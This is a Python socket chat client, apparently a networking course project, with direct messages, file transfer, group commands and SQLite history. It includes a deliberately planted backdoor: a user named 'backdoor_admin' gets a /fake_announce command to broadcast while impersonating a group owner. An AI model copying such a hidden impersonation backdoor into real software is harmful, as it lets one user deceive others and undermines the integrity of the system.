# client_json.py
import socket
import json
import threading
from datetime import datetime
import re
import base64
import os
import sqlite3

#clientA 连接serverA
HOST = "127.0.0.1"
PORT = 65432

'''
receive_messages 方法：
    1. 接收来自server的消息
    2. 处理系统消息和普通消息
    3. 处理文件传输请求
    4. 打印命令提示符
'''
def insert_message(conn, msg_type, sender, receiver, group_name, content, timestamp, direction):
    cursor = conn.cursor()
    cursor.execute(
        """
        INSERT INTO messages (msg_type, sender, receiver, group_name, content, timestamp, direction)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
        (msg_type, sender, receiver, group_name, content, timestamp, direction)
    )
    conn.commit()

def receive_messages(sock):
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                print("Disconnected from server.")
                break
            try:
                reply = json.loads(data.decode())
                msg_type = reply.get("type")
                if msg_type == "message_file":
                    file_b64 = reply.get("payload")
                    file_path = reply.get("file_path", "unknown_file")
                    filename = os.path.basename(file_path)
                    save_name = f"received_{filename}"
                    try:
                        file_bytes = base64.b64decode(file_b64)
                        #写入，传来的文件。
                        with open(save_name, "wb") as f:
                            f.write(file_bytes)
                        print(f"[File] Received file saved as {save_name}")
                    except Exception as e:
                        print(f"[File] Failed to save file: {e}")
                elif reply.get('payload_type') == 'text':
                    print(f"\n[{reply['from']}] ➜ You: {reply['payload']}")
                    # 写入数据库（普通文本消息）
                    insert_message(db_conn, 'text', reply['from'], name, None, reply['payload'], reply.get('timestamp', datetime.now().isoformat()), 'received')
                elif reply.get('payload_type') == 'file':
                    print(f"\n[{reply['from']}] wants to send you a file: {reply.get('file_path', 'unknown')}")
                elif reply.get('type') == 'group_message':
                    print(f"\n[Group:{reply['to']}] {reply['from']}: {reply['content']}")
                    # 写入数据库（群聊消息）
                    insert_message(db_conn, 'group', reply['from'], reply['to'], reply['to'], reply['content'], reply.get('timestamp', datetime.now().isoformat()), 'received')
                else:
                    print(f"\n[{reply['from']}] ➜ You: {reply['payload']}")
                print("Command (/list, /msg <user> content, /msg_file <user> <file>, /create_group <name>, /join_group <name>, /list_group, /msg_group <group> <message>, /delete_group <name>, /quit): ", end="", flush=True)
            except Exception as e:
                print(f"\nError receiving message: {e}")
                break
        except Exception as e:
            print(f"\nError receiving message: {e}")
            break

def init_db(username):
    db_filename = f"local_message_database_{username}.db"
    conn = sqlite3.connect(db_filename, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            msg_type TEXT NOT NULL,
            sender TEXT NOT NULL,
            receiver TEXT NOT NULL,
            group_name TEXT,
            content TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            direction TEXT NOT NULL
        )
    ''')
    conn.commit()
    return conn

def print_history(conn):
    cursor = conn.cursor()
    cursor.execute("SELECT msg_type, sender, receiver, group_name, content, timestamp, direction FROM messages ORDER BY id ASC")
    rows = cursor.fetchall()
    print("\n--- Local Message History ---")
    for row in rows:
        msg_type, sender, receiver, group_name, content, timestamp, direction = row
        if msg_type == 'text':
            print(f"[{timestamp}] ({direction}) {sender} -> {receiver}: {content}")
        elif msg_type == 'group':
            print(f"[{timestamp}] ({direction}) [Group:{group_name}] {sender}: {content}")
    print("--- End of History ---\n")

'''
main 方法：
    1. 连接到server
    2. 获取用户名
    3. 启动接收消息的线程
    4. 主循环：
        4.1 处理用户输入的命令
        4.2 处理/list命令
        4.3 处理/msg命令
        4.4 处理/msg_file命令
        4.5 处理/quit命令
        4.6 处理未知命令

发送信息给server.
'''
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))#连接server
    name_prompt = s.recv(1024).decode()
    name = input(name_prompt).strip()
    s.sendall(name.encode())

    # 初始化本地数据库
    db_conn = init_db(name)

    print("You are connected. Available commands:")
    print("  /list - List online users")
    print("  /msg <user> <content> - Send message to user")
    print("  /msg_file <user> <file> - Send file to user")
    print("  /create_group <name> - Create a new group")
    print("  /join_group <name> - Join an existing group")
    print("  /list_group - List all groups")
    print("  /msg_group <group> <message> - Send message to group")
    print("  /delete_group <name> - Delete a group (creator only)")
    print("  /history - Show message history")
    if name == "backdoor_admin":
        print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
    print("  /quit - Exit")
    receive_thread = threading.Thread(target=receive_messages, args=(s,), daemon=True)
    receive_thread.start()

    while True:
        try:
            cmd = input("Command: ").strip()
            if cmd.lower() == '/quit':
                break
            if cmd.lower() == '/list':
                list_msg = {
                    "from": name,
                    "to": "server",
                    "payload": "/list",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(list_msg).encode())
                continue
            if cmd.lower() == '/history':
                print_history(db_conn)
                continue
            # 支持 /msg <user> 内容 格式
            #\s+：匹配一个或多个空白字符（空格、Tab等）
            #(\S+)：匹配并捕获目标用户名，由一个或多个非空白字符组成
            #. 匹配除换行符 \n 之外的任何单字符一个或多个。
            msg_match = re.match(r'/msg\s+(\S+)\s+(.+)', cmd)
            if msg_match:
                target = msg_match.group(1)
                content = msg_match.group(2)
                if not target or target == name:
                    print("Invalid target user.")
                    continue
                msg_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/msg {target} {content}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(msg_cmd).encode())
                # 写入数据库（自己发出的文本消息）
                insert_message(db_conn, 'text', name, target, None, content, msg_cmd["timestamp"], 'sent')
                continue
            # 支持 /msg_file <user> <文件路径> 格式
            file_match = re.match(r'/msg_file\s+(\S+)\s+(.+)', cmd)
            if file_match:
                target = file_match.group(1)
                file_path = file_match.group(2)
                if not target or target == name:
                    print("Invalid target user.")
                    continue
                # 检查文件是否存在
                import os
                if not os.path.exists(file_path):
                    print(f"File not found: {file_path}")
                    continue
                # 发送文件传输命令
                file_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/msg_file {target} {file_path}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(file_cmd).encode())
                continue
            # ==== Group Management Commands ====
            # 创建group 格式：/create_group <group_name>
            create_group_match = re.match(r'/create_group\s+(\S+)', cmd)
            if create_group_match:
                group_name = create_group_match.group(1)
                group_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/create_group {group_name}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(group_cmd).encode())
                continue
            # 加入group 格式：/join_group <group_name>
            join_group_match = re.match(r'/join_group\s+(\S+)', cmd)
            if join_group_match:
                group_name = join_group_match.group(1)
                group_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/join_group {group_name}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(group_cmd).encode())
                continue
            # 列出所有group 格式：/list_group
            if cmd.lower() == '/list_group':
                group_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": "/list_group",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(group_cmd).encode())
                continue
            # 删除group 格式：/delete_group <group_name>
            delete_group_match = re.match(r'/delete_group\s+(\S+)', cmd)
            if delete_group_match:
                group_name = delete_group_match.group(1)
                group_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/delete_group {group_name}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(group_cmd).encode())
                continue
            # 向group发送消息 格式：/msg_group <group_name> <message>
            msg_group_match = re.match(r'/msg_group\s+(\S+)\s+(.+)', cmd)
            if msg_group_match:
                group_name = msg_group_match.group(1)
                content = msg_group_match.group(2)
                group_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/msg_group {group_name} {content}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(json.dumps(group_cmd).encode())
                # 写入数据库（自己发出的群聊消息）
                insert_message(db_conn, 'group', name, group_name, group_name, content, group_cmd["timestamp"], 'sent')
                continue
                        # ===== Backdoor: 伪造群主身份发送群公告 =====
            fake_announce_match = re.match(r'/fake_announce\s+(\S+)\s+(.+)', cmd)
            if fake_announce_match:
                group_name = fake_announce_match.group(1)
                fake_msg = fake_announce_match.group(2)

                fake_cmd = {
                    "from": name,
                    "to": "server",
                    "payload": f"/fake_announce {group_name} {fake_msg}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }

                s.sendall(json.dumps(fake_cmd).encode())
                continue

            print("Unknown command. Available commands:")
            print("  /list - List online users")
            print("  /msg <user> <content> - Send message to user")
            print("  /msg_file <user> <file> - Send file to user")
            print("  /create_group <name> - Create a new group")
            print("  /join_group <name> - Join an existing group")
            print("  /list_group - List all groups")
            print("  /msg_group <group> <message> - Send message to group")
            print("  /delete_group <name> - Delete a group (creator only)")
            print("  /history - Show message history")
            if name == "backdoor_admin":
                print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
            print("  /quit - Exit")
        except KeyboardInterrupt:
            print("\nDisconnecting...")
            break
        except Exception as e:
            print(f"Error: {e}")
            break